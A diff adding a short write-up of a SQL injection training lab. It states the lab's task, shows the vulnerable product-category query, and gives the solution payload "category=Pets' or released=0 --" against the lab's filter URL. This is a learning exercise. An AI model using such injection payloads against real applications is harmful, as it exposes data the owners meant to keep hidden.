@@ -1,0 +1,20 @@
+Lab #1:SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+Target:
+     perform a SQL injection attack that causes the application to display one or more unreleased products
+
+Hint: 
+    This lab contains a SQL injection vulnerability in the product category filter. 
+    When the user selects a category, the application carries out a SQL query like the following:
+
+        SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+
+Solution:
+
+  The filter input parameter is vulnerable to sql injection:
+
+  https://0a1b004904a4fa98832d6eb800290095.web-security-academy.net/filter?category=Pets
+
+  attack pattern :
+    category=Pets' or released=0 --
